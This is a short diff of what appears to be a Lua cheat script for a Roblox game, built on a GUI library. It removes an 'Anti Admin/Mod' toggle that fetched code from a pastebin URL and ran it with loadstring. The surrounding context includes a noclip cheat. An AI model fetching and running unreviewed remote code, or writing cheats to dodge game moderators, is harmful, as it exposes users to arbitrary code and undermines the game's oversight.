@@ -379,16 +379,7 @@ end)
         end
     })
 
-    local antiAdminLoaded = false
-    Tabs.Misc:AddToggle("AntiAdminToggle", {Title = "Anti Admin/Mod (Kick)", Default = false}):OnChanged(function(v)
-        if v and not antiAdminLoaded then
-            antiAdminLoaded = true
-            task.spawn(function() pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/fuDuZziN"))() end) end)
-        elseif not v and antiAdminLoaded then
-            Fluent:Notify({Title = "Notice", Content = "Anti Admin script is already loaded and active.", Duration = 3})
-        end
-    end)
-
+    
     local noclip = false
     RunService.Stepped:Connect(function()
         if noclip and player.Character then
